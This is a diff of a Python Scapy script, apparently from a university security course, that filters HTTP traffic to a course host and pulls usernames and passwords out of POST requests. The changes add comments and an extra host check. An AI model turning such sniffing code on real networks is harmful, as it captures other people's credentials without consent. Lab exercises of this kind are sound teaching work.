@@ -16,10 +16,10 @@ def parse_packet(packet):
     	for request in packet[S.TCP].payload:
     		s = str(request)
     		lst = s.split()
-    		if 'POST' in s:
-    			result = urlparse.parse_qs(s)
+    		if 'POST' in s:  #POST method
+    			result = urlparse.parse_qs(s) 
     			if lst.index('Host:') + 1 == lst.index('infosec17.cs.tau.ac.il'):
-    				if (result['username'] == '') or (result['password'] == ''):
+    				if (result['username'] == '') or (result['password'] == ''):  #check if has username and password
     					return None
     				else:
     					user = result['username']
@@ -36,10 +36,10 @@ def packet_filter(packet):
     Filter to keep only HTTP traffic (port 80) from the client to the server.
     """
     if  S.TCP in packet:
-    	if (packet[S.TCP].dport == 80) and (packet.haslayer(S.Raw)):
+    	if (packet[S.TCP].dport == 80) and (packet.haslayer(S.Raw)): #http request not empty
     		request = str(packet[S.TCP].payload).split()
-    		if 'Host:' in request:
-    			if request.index('Host:') + 1 == request.index(WEBSITE):
+    		if 'Host:' in request and WEBSITE in request:  
+    			if request.index('Host:') + 1 == request.index(WEBSITE): #host is infosec17
     				return True
     return False
 
